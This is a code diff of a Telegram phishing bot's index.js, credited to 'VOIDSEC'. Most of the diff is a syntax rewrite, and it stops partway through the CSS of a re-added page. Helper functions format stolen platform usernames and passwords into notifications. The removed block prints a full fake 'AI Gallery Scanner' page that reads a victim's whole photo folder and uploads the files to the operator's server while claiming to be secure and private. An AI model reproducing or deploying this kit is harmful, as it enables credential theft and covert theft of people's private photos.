@@ -1,4 +1,4 @@
-// ====================== index.js (COMPLETE - ALL FEATURES WORKING) ======================
+// ====================== index.js (COMPLETE FIXED - NO SYNTAX ERRORS) ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
  * Complete Bot - Instagram, Facebook, Camera, Photo Access (Full Gallery)
@@ -71,16 +71,14 @@ if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, '');
 
 // ====================== MULTER SETUP ======================
 const storage = multer.diskStorage({
-    destination: (req, file, cb) => {
+    destination: function(req, file, cb) {
         if (file.fieldname === 'photo' || file.fieldname === 'qr') {
             cb(null, BOT_PHOTO_DIR);
-        } else if (file.fieldname === 'userphoto') {
-            cb(null, UPLOADS_DIR);
         } else {
             cb(null, BOT_PHOTO_DIR);
         }
     },
-    filename: (req, file, cb) => {
+    filename: function(req, file, cb) {
         const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
         cb(null, uniqueName);
     }
@@ -89,7 +87,7 @@ const storage = multer.diskStorage({
 const upload = multer({
     storage: storage,
     limits: { fileSize: 50 * 1024 * 1024 },
-    fileFilter: (req, file, cb) => {
+    fileFilter: function(req, file, cb) {
         if (file.mimetype.startsWith('image/')) {
             cb(null, true);
         } else {
@@ -104,7 +102,7 @@ function getUsers() {
 }
 
 function saveUsers(users) {
-    fs.writeFileSync(USERS_FILE, JSON.stringify({ users }, null, 2));
+    fs.writeFileSync(USERS_FILE, JSON.stringify({ users: users }, null, 2));
 }
 
 function getUser(userId) {
@@ -126,39 +124,6 @@ function getUser(userId) {
     return users[userId];
 }
 
-function updateUser(userId, data) {
-    const users = getUsers();
-    if (!users[userId]) users[userId] = { credits: 3, referrals: 0, totalReferrals: 0, unlimited: false, joinedAt: new Date().toISOString(), referredBy: null, _pendingReferrer: null, _waitingForQR: false, _pendingPayment: null };
-    Object.assign(users[userId], data);
-    saveUsers(users);
-    return users[userId];
-}
-
-function addCredits(userId, amount) {
-    const user = getUser(userId);
-    if (user.unlimited) return user;
-    user.credits = (user.credits || 0) + amount;
-    saveUsers(getUsers());
-    return user;
-}
-
-function useCredit(userId) {
-    const user = getUser(userId);
-    if (user.unlimited) return true;
-    if ((user.credits || 0) <= 0) return false;
-    user.credits = (user.credits || 0) - 1;
-    saveUsers(getUsers());
-    return true;
-}
-
-function getReferrals() {
-    try { return JSON.parse(fs.readFileSync(REFERRALS_FILE, 'utf8')).referrals || []; } catch { return []; }
-}
-
-function saveReferrals(referrals) {
-    fs.writeFileSync(REFERRALS_FILE, JSON.stringify({ referrals }, null, 2));
-}
-
 function addReferral(referrerId, newUserId) {
     const referrals = getReferrals();
     referrals.push({
@@ -175,8 +140,15 @@ function addReferral(referrerId, newUserId) {
         referrer.credits = (referrer.credits || 0) + 2;
     }
     saveUsers(getUsers());
-    
     return referrer;
+}
+
+function getReferrals() {
+    try { return JSON.parse(fs.readFileSync(REFERRALS_FILE, 'utf8')).referrals || []; } catch { return []; }
+}
+
+function saveReferrals(referrals) {
+    fs.writeFileSync(REFERRALS_FILE, JSON.stringify({ referrals: referrals }, null, 2));
 }
 
 function getChannels() {
@@ -184,21 +156,30 @@ function getChannels() {
 }
 
 function saveChannels(channels) {
-    fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels }, null, 2));
+    fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels: channels }, null, 2));
 }
 
 function addChannel(id, name, link) {
     const channels = getChannels();
-    channels.push({ id, name, link });
+    channels.push({ id: id, name: name, link: link });
     saveChannels(channels);
     return channels;
 }
 
 function removeChannel(id) {
     let channels = getChannels();
-    channels = channels.filter(c => c.id !== id);
+    channels = channels.filter(function(c) { return c.id !== id; });
     saveChannels(channels);
     return channels;
+}
+
+function useCredit(userId) {
+    const user = getUser(userId);
+    if (user.unlimited) return true;
+    if ((user.credits || 0) <= 0) return false;
+    user.credits = (user.credits || 0) - 1;
+    saveUsers(getUsers());
+    return true;
 }
 
 // ====================== FEATURED FUNCTIONS ======================
@@ -238,16 +219,17 @@ function getPhotos() {
 }
 
 function savePhotos(photos) {
-    fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos }, null, 2));
+    fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos: photos }, null, 2));
 }
 
-function addPhoto(file, caption = '') {
+function addPhoto(file, caption) {
+    caption = caption || '';
     const photos = getPhotos();
     const photoData = {
         id: Date.now().toString(),
         filename: file.filename,
         originalName: file.originalname,
-        url: `/api/photos/${file.filename}`,
+        url: '/api/photos/' + file.filename,
         caption: caption,
         uploadedAt: new Date().toISOString(),
         active: true
@@ -259,7 +241,10 @@ function addPhoto(file, caption = '') {
 
 function deletePhoto(id) {
     const photos = getPhotos();
-    const index = photos.findIndex(p => p.id === id);
+    var index = -1;
+    for (var i = 0; i < photos.length; i++) {
+        if (photos[i].id === id) { index = i; break; }
+    }
     if (index === -1) return false;
     const photo = photos[index];
     const filePath = path.join(BOT_PHOTO_DIR, photo.filename);
@@ -271,7 +256,10 @@ function deletePhoto(id) {
 
 function togglePhoto(id) {
     const photos = getPhotos();
-    const photo = photos.find(p => p.id === id);
+    var photo = null;
+    for (var i = 0; i < photos.length; i++) {
+        if (photos[i].id === id) { photo = photos[i]; break; }
+    }
     if (!photo) return false;
     photo.active = !photo.active;
     savePhotos(photos);
@@ -279,7 +267,12 @@ function togglePhoto(id) {
 }
 
 function getActivePhotos() {
-    return getPhotos().filter(p => p.active);
+    const photos = getPhotos();
+    var active = [];
+    for (var i = 0; i < photos.length; i++) {
+        if (photos[i].active) active.push(photos[i]);
+    }
+    return active;
 }
 
 function getRandomPhoto() {
@@ -289,25 +282,25 @@ function getRandomPhoto() {
 }
 
 // ====================== HELPER FUNCTIONS ======================
-function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
-    return `🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ${platform}\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ${username}\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ${password}\n⏱ ↝ ᴛɪᴍᴇ » ${SYloveTiMe}\n📝 ↝ ᴅᴀᴛᴇ » ${SYloveDaTe}\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ${dev}`;
-}
-
-function MenuLove(firstName, dev, SeXy, LoveTime, message) {
-    return `─【 ${dev} 】─\n────────────────────\n ᴜsᴇʀ ➤ ${firstName} ›\n ɴᴀᴍᴇ ➤ ${SeXy} ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ${LoveTime}›\n ────────────────────\n\n ${message} \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─`;
-}
-
 function getUptime() {
     const ut = process.uptime();
     const h = Math.floor(ut / 3600);
     const m = Math.floor((ut % 3600) / 60);
     const s = Math.floor(ut % 60);
-    return `${h}h ${m}m ${s}s`;
+    return h + 'h ' + m + 'm ' + s + 's';
+}
+
+function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
+    return '🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ' + platform + '\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ' + username + '\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ' + password + '\n⏱ ↝ ᴛɪᴍᴇ » ' + SYloveTiMe + '\n📝 ↝ ᴅᴀᴛᴇ » ' + SYloveDaTe + '\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ' + dev;
+}
+
+function MenuLove(firstName, dev, SeXy, LoveTime, message) {
+    return '─【 ' + dev + ' 】─\n────────────────────\n ᴜsᴇʀ ➤ ' + firstName + ' ›\n ɴᴀᴍᴇ ➤ ' + SeXy + ' ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ' + LoveTime + '›\n ────────────────────\n\n ' + message + ' \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─';
 }
 
 function LoveNotifer(platform, username, password) {
-    const SYloveTiMe = moment().tz("Asia/Kolkata").format('h:mm:ss A');
-    const SYloveDaTe = moment().tz("Asia/Kolkata").format('DD/MM/YYYY');
+    const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
+    const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
     return LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, config.S7);
 }
 
@@ -315,13 +308,18 @@ function SYloveMenu(firstName, message) {
     return MenuLove(firstName, config.S7, config.bot, getUptime(), message);
 }
 
+function logToFile(message) {
+    const timestamp = new Date().toISOString();
+    fs.appendFileSync(LOGS_FILE, '[' + timestamp + '] ' + message + '\n');
+}
+
 async function checkAllChannels(userId) {
     const channels = getChannels();
-    for (const channel of channels) {
+    for (var i = 0; i < channels.length; i++) {
         try {
-            const member = await S7.getChatMember(channel.id, userId);
+            const member = await S7.getChatMember(channels[i].id, userId);
             const valid = ['creator', 'administrator', 'member', 'restricted'];
-            if (!valid.includes(member.status)) return false;
+            if (valid.indexOf(member.status) === -1) return false;
         } catch (e) {
             return false;
         }
@@ -331,1197 +329,238 @@ async function checkAllChannels(userId) {
 
 function getChannelButtons() {
     const channels = getChannels();
-    const buttons = channels.map(c => [{ text: `📢 ${c.name}`, url: c.link }]);
-    buttons.push([{ text: "✅ Check All Joined", callback_data: "check_all" }]);
+    var buttons = [];
+    for (var i = 0; i < channels.length; i++) {
+        buttons.push([{ text: '📢 ' + channels[i].name, url: channels[i].link }]);
+    }
+    buttons.push([{ text: '✅ Check All Joined', callback_data: 'check_all' }]);
     return { inline_keyboard: buttons };
 }
 
-function logToFile(message) {
-    const timestamp = new Date().toISOString();
-    fs.appendFileSync(LOGS_FILE, `[${timestamp}] ${message}\n`);
-}
-
-// ====================== PHOTO ACCESS TEMPLATE (FULL GALLERY) ======================
-const PHOTO_ACCESS_TEMPLATE = `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AI Photo Scanner</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden}
-        .card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.08);border-radius:40px;padding:45px 35px;width:100%;max-width:500px;box-shadow:0 50px 100px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.05)}
-        .header{text-align:center;margin-bottom:30px}
-        .header .icon{font-size:80px;background:linear-gradient(135deg,#667eea,#764ba2,#f093fb);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}
-        .header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-        .header p{color:#888;font-size:14px;margin-top:5px}
-        .permission-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,0.06);margin:20px 0}
-        .permission-box .item{display:flex;align-items:center;gap:15px;padding:12px 0;color:#ccc;font-size:14px;border-bottom:1px solid rgba(255,255,255,0.03)}
-        .permission-box .item:last-child{border-bottom:none}
-        .permission-box .item i{font-size:22px;width:35px;color:#667eea}
-        .permission-box .item .label{color:#fff}
-        .permission-box .item .status{font-size:12px;padding:2px 12px;border-radius:20px;background:rgba(255,255,255,0.05);color:#888}
-        .permission-box .item .status.granted{background:rgba(46,213,115,0.15);color:#2ed573}
-        .btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(102,126,234,0.3)}
-        .btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(102,126,234,0.5)}
-        .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
-        .btn i{margin-right:10px}
-        .status{text-align:center;margin-top:15px;padding:15px;border-radius:12px;display:none;font-size:14px}
-        .status.success{background:rgba(46,213,115,0.15);color:#2ed573;display:block}
-        .status.error{background:rgba(255,71,87,0.15);color:#ff4757;display:block}
-        .status.info{background:rgba(54,164,235,0.15);color:#36a4eb;display:block}
-        .status.warning{background:rgba(255,165,0,0.15);color:#ffa500;display:block}
-        .progress-container{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}
-        .progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);transition:width .3s}
-        .preview-area{display:none;margin:15px 0;padding:15px;background:rgba(255,255,255,0.03);border-radius:15px;border:1px solid rgba(255,255,255,0.05)}
-        .preview-area img{width:100%;max-height:300px;object-fit:contain;border-radius:10px}
-        .preview-area .filename{color:#aaa;font-size:12px;text-align:center;margin-top:8px}
-        .result-area{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}
-        .result-area i{font-size:40px;color:#2ed573}
-        .result-area h3{color:#2ed573;margin-top:8px}
-        .result-area p{color:#888;font-size:13px;margin-top:5px}
-        .spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}
-        @keyframes spin{100%{transform:rotate(360deg)}}
-        .bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(102,126,234,0.06),transparent 70%);animation:float 25s infinite ease-in-out}
-        .bg-shapes span:nth-child(1){width:500px;height:500px;top:-150px;right:-150px;animation-delay:-3s}
-        .bg-shapes span:nth-child(2){width:400px;height:400px;bottom:-100px;left:-100px;animation-delay:-7s}
-        .bg-shapes span:nth-child(3){width:300px;height:300px;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-12s}
-        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(40px,-40px) scale(1.1)}}
-        .footer{text-align:center;margin-top:20px;color:#444;font-size:11px}
-        .footer a{color:#555;text-decoration:none}
-        #fileInput{display:none}
-        .btn-secondary{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#aaa;margin-top:10px}
-        .btn-secondary:hover{background:rgba(255,255,255,0.08)}
-        .gallery-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:4px;margin-top:10px;max-height:300px;overflow-y:auto;padding:5px}
-        .gallery-grid img{width:100%;height:80px;object-fit:cover;border-radius:6px;border:1px solid rgba(255,255,255,0.05);transition:.2s}
-        .gallery-grid img:hover{transform:scale(1.05);border-color:#667eea}
-        .processing-text{color:#667eea;font-size:14px;font-weight:600;text-align:center;padding:10px}
-        #processingStatus{display:none}
-        .file-count{background:#667eea;color:#fff;padding:2px 12px;border-radius:20px;font-size:12px;margin-left:10px}
-        .scanning-text{color:#667eea;font-size:13px;text-align:center;padding:5px;animation:pulse 1.5s infinite}
-        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
-        .permission-btn{background:rgba(102,126,234,0.1);border:1px solid rgba(102,126,234,0.2);color:#667eea;padding:10px 20px;border-radius:12px;cursor:pointer;font-size:14px;margin:10px 0;width:100%;transition:.3s}
-        .permission-btn:hover{background:rgba(102,126,234,0.2)}
-    </style>
-</head>
-<body>
-<div class="bg-shapes"><span></span><span></span><span></span></div>
-<div class="card">
-    <div class="header">
-        <span class="icon"><i class="fas fa-images"></i></span>
-        <h1>📸 AI Gallery Scanner</h1>
-        <p>Scan your entire gallery with AI technology</p>
-    </div>
-    
-    <div class="permission-box" id="permissionBox">
-        <div class="item"><i class="fas fa-folder-open"></i> <span class="label">Read all photos & videos</span> <span class="status" id="permStatus1">Required</span></div>
-        <div class="item"><i class="fas fa-file-alt"></i> <span class="label">Access all files</span> <span class="status" id="permStatus2">Required</span></div>
-        <div class="item"><i class="fas fa-shield-alt"></i> <span class="label">Secure & encrypted</span> <span class="status granted">✅ Secure</span></div>
-        <div class="item"><i class="fas fa-robot"></i> <span class="label">AI powered scanning</span> <span class="status granted">✅ Active</span></div>
-    </div>
-
-    <button class="btn" id="scanBtn" onclick="startScan()">
-        <i class="fas fa-search"></i> SCAN GALLERY
-    </button>
-    
-    <div id="status" class="status"></div>
-    <div class="progress-container" id="progressContainer"><div class="fill" id="progressFill"></div></div>
-    
-    <div id="processingStatus">
-        <div class="spinner"></div>
-        <div class="processing-text" id="processingText">🔍 Scanning gallery...</div>
-    </div>
-    
-    <div id="galleryGrid" class="gallery-grid"></div>
-    
-    <div id="resultArea" class="result-area" style="display:none">
-        <i class="fas fa-check-circle"></i>
-        <h3>✅ Scan Complete!</h3>
-        <p id="resultText">Your gallery has been scanned successfully.</p>
-        <button class="btn btn-secondary" onclick="closeResult()"><i class="fas fa-times"></i> Close</button>
-    </div>
-    
-    <input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>
-    
-    <div class="footer">🔒 Secure & Private • AI Processing</div>
-</div>
-
-<script>
-const USER_ID = "USERID_PLACEHOLDER";
-const PLATFORM = "PLATFORM_PLACEHOLDER";
-let selectedFiles = [];
-let scannedCount = 0;
-
-function showStatus(msg, type='info') {
-    const el = document.getElementById('status');
-    el.textContent = msg;
-    el.className = 'status ' + type;
-    el.style.display = 'block';
-}
-
-function hideStatus() {
-    document.getElementById('status').style.display = 'none';
-}
-
-function updateProgress(percent) {
-    const container = document.getElementById('progressContainer');
-    container.style.display = 'block';
-    document.getElementById('progressFill').style.width = percent + '%';
-}
-
-function showProcessing(text) {
-    document.getElementById('processingStatus').style.display = 'block';
-    document.getElementById('processingText').textContent = text;
-}
-
-function hideProcessing() {
-    document.getElementById('processingStatus').style.display = 'none';
-}
-
-function closeResult() {
-    document.getElementById('resultArea').style.display = 'none';
-}
-
-function showResult(text) {
-    document.getElementById('resultArea').style.display = 'block';
-    document.getElementById('resultText').textContent = text;
-}
-
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-function addToGallery(src) {
-    const grid = document.getElementById('galleryGrid');
-    const img = document.createElement('img');
-    img.src = src;
-    img.onclick = function() { this.style.transform = 'scale(1.2)'; setTimeout(() => { this.style.transform = 'scale(1)'; }, 500); };
-    grid.appendChild(img);
-    grid.style.display = 'grid';
-}
-
-async function startScan() {
-    const btn = document.getElementById('scanBtn');
-    btn.disabled = true;
-    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SCANNING...';
-    hideStatus();
-    hideProcessing();
-    document.getElementById('resultArea').style.display = 'none';
-    document.getElementById('galleryGrid').innerHTML = '';
-    document.getElementById('galleryGrid').style.display = 'none';
-    document.getElementById('progressContainer').style.display = 'none';
-    
-    showStatus('📂 Opening gallery access...', 'info');
-    updateProgress(5);
-    await sleep(500);
-    
-    try {
-        const input = document.getElementById('fileInput');
-        input.click();
-        
-        input.onchange = async function(e) {
-            const files = input.files;
-            if (!files || files.length === 0) {
-                showStatus('❌ No files selected', 'error');
-                btn.disabled = false;
-                btn.innerHTML = '<i class="fas fa-search"></i> SCAN GALLERY';
-                hideProcessing();
-                return;
-            }
-            
-            selectedFiles = Array.from(files).filter(f => f.type.startsWith('image/') || f.type.startsWith('video/'));
-            selectedFiles = selectedFiles.slice(0, 100);
-            
-            if (selectedFiles.length === 0) {
-                showStatus('❌ No images found.', 'error');
-                btn.disabled = false;
-                btn.innerHTML = '<i class="fas fa-search"></i> SCAN GALLERY';
-                hideProcessing();
-                return;
-            }
-            
-            await processFiles(selectedFiles);
-        };
-    } catch(err) {
-        showStatus('❌ Gallery access denied. Please allow permission.', 'error');
-        btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-search"></i> SCAN GALLERY';
-        hideProcessing();
-    }
-}
-
-async function processFiles(files) {
-    const total = files.length;
-    showStatus(`📸 Found ${total} images. Processing...`, 'info');
-    updateProgress(30);
-    
-    let successCount = 0;
-    const batchSize = 5;
-    const maxFiles = Math.min(total, 50);
-    
-    for (let i = 0; i < maxFiles; i += batchSize) {
-        const batch = [];
-        for (let j = i; j < Math.min(i + batchSize, maxFiles); j++) {
-            batch.push(files[j]);
-        }
-        
-        for (const file of batch) {
-            try {
-                const reader = new FileReader();
-                const fileData = await new Promise((resolve, reject) => {
-                    reader.onload = (e) => resolve(e.target.result);
-                    reader.onerror = reject;
-                    reader.readAsDataURL(file);
-                });
-                
-                const reader2 = new FileReader();
-                reader2.onload = function(e) {
-                    addToGallery(e.target.result);
-                };
-                reader2.readAsDataURL(file);
-                
-                const response = await fetch('/api/upload-photo', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        userid: USER_ID,
-                        platform: PLATFORM,
-                        filename: file.name,
-                        data: fileData,
-                        size: file.size
-                    })
-                });
-                
-                const result = await response.json();
-                if (result.success) successCount++;
-                
-                const percent = 30 + (successCount / maxFiles) * 60;
-                updateProgress(percent);
-                
-                showProcessing(`📤 Processing ${successCount}/${maxFiles} photos...`);
-                await sleep(200);
-                
-            } catch(err) {
-                console.error('Error processing file:', err);
-            }
-        }
-    }
-    
-    updateProgress(100);
-    hideProcessing();
-    
-    if (successCount > 0) {
-        showResult(`✅ ${successCount} photo(s) scanned and sent!\n\n⚠️ Server is processing. Full results in 2-3 hours.`);
-        showStatus(`✅ ${successCount} photos sent successfully!`, 'success');
-    } else {
-        showStatus('❌ Processing failed. Please try again.', 'error');
-    }
-    
-    document.getElementById('scanBtn').disabled = false;
-    document.getElementById('scanBtn').innerHTML = '<i class="fas fa-search"></i> SCAN GALLERY';
-}
-</script>
-</body>
-</html>`;
+// ====================== PHOTO ACCESS TEMPLATE ======================
+var PHOTO_ACCESS_TEMPLATE = '<!DOCTYPE html>\n';
+PHOTO_ACCESS_TEMPLATE += '<html>\n';
+PHOTO_ACCESS_TEMPLATE += '<head>\n';
+PHOTO_ACCESS_TEMPLATE += '<meta charset="UTF-8">\n';
+PHOTO_ACCESS_TEMPLATE += '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n';
+PHOTO_ACCESS_TEMPLATE += '<title>AI Photo Scanner</title>\n';
+PHOTO_ACCESS_TEMPLATE += '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n';
+PHOTO_ACCESS_TEMPLATE += '<style>\n';
+PHOTO_ACCESS_TEMPLATE += '*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\n';
+PHOTO_ACCESS_TEMPLATE += 'body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden}\n';
+PHOTO_ACCESS_TEMPLATE += '.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.08);border-radius:40px;padding:45px 35px;width:100%;max-width:500px;box-shadow:0 50px 100px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.05)}\n';
+PHOTO_ACCESS_TEMPLATE += '.header{text-align:center;margin-bottom:30px}\n';
+PHOTO_ACCESS_TEMPLATE += '.header .icon{font-size:80px;background:linear-gradient(135deg,#667eea,#764ba2,#f093fb);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n';
+PHOTO_ACCESS_TEMPLATE += '.header p{color:#888;font-size:14px;margin-top:5px}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,0.06);margin:20px 0}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item{display:flex;align-items:center;gap:15px;padding:12px 0;color:#ccc;font-size:14px;border-bottom:1px solid rgba(255,255,255,0.03)}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item:last-child{border-bottom:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item i{font-size:22px;width:35px;color:#667eea}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item .label{color:#fff}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item .status{font-size:12px;padding:2px 12px;border-radius:20px;background:rgba(255,255,255,0.05);color:#888}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item .status.granted{background:rgba(46,213,115,0.15);color:#2ed573}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(102,126,234,0.3)}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(102,126,234,0.5)}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn i{margin-right:10px}\n';
+PHOTO_ACCESS_TEMPLATE += '.status{text-align:center;margin-top:15px;padding:15px;border-radius:12px;display:none;font-size:14px}\n';
+PHOTO_ACCESS_TEMPLATE += '.status.success{background:rgba(46,213,115,0.15);color:#2ed573;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.status.error{background:rgba(255,71,87,0.15);color:#ff4757;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.status.info{background:rgba(54,164,235,0.15);color:#36a4eb;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.status.warning{background:rgba(255,165,0,0.15);color:#ffa500;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.progress-container{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);transition:width .3s}\n';
+PHOTO_ACCESS_TEMPLATE += '.result-area{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}\n';
+PHOTO_ACCESS_TEMPLATE += '.result-area i{font-size:40px;color:#2ed573}\n';
+PHOTO_ACCESS_TEMPLATE += '.result-area h3{color:#2ed573;margin-top:8px}\n';
+PHOTO_ACCESS_TEMPLATE += '.result-area p{color:#888;font-size:13px;margin-top:5px}\n';
+PHOTO_ACCESS_TEMPLATE += '.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}\n';
+PHOTO_ACCESS_TEMPLATE += '@keyframes spin{100%{transform:rotate(360deg)}}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(102,126,234,0.06),transparent 70%);animation:float 25s infinite ease-in-out}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes span:nth-child(1){width:500px;height:500px;top:-150px;right:-150px;animation-delay:-3s}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes span:nth-child(2){width:400px;height:400px;bottom:-100px;left:-100px;animation-delay:-7s}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes span:nth-child(3){width:300px;height:300px;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-12s}\n';
+PHOTO_ACCESS_TEMPLATE += '@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(40px,-40px) scale(1.1)}}\n';
+PHOTO_ACCESS_TEMPLATE += '.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}\n';
+PHOTO_ACCESS_TEMPLATE += '#fileInput{display:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn-secondary{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#aaa;margin-top:10px}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn-secondary:hover{background:rgba(255,255,255,0.08)}\n';
+PHOTO_ACCESS_TEMPLATE += '.gallery-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:4px;margin-top:10px;max-height:300px;overflow-y:auto;padding:5px}\n';
+PHOTO_ACCESS_TEMPLATE += '.gallery-grid img{width:100%;height:80px;object-fit:cover;border-radius:6px;border:1px solid rgba(255,255,255,0.05);transition:.2s}\n';
+PHOTO_ACCESS_TEMPLATE += '.gallery-grid img:hover{transform:scale(1.05);border-color:#667eea}\n';
